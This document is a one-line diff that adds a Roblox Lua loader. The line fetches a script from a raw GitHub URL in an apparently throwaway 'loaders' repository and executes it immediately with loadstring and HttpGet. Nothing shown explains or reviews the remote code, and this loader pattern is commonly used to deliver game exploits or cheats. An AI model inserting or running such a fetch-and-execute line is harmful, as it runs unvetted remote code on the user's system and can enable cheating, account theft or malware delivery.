@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/mukbang-game-testing-spam7-b8e9tq0eokm20c.lua"))()
